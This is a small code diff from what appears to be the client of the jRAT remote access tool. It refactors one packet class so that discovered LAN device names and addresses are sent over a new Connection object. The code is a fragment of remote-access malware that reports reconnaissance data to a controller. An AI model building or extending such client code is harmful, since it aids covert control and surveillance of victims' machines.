@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public class Packet49LanDevices extends AbstractOutgoingPacket {
@@ -15,11 +14,11 @@ public class Packet49LanDevices extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(this.device);
+	public void write(Connection con) throws Exception {
+        con.writeLine(this.device);
 
 		if (this.address != null) {
-			sw.writeLine(this.address);
+            con.writeLine(this.address);
 		}
 	}
 
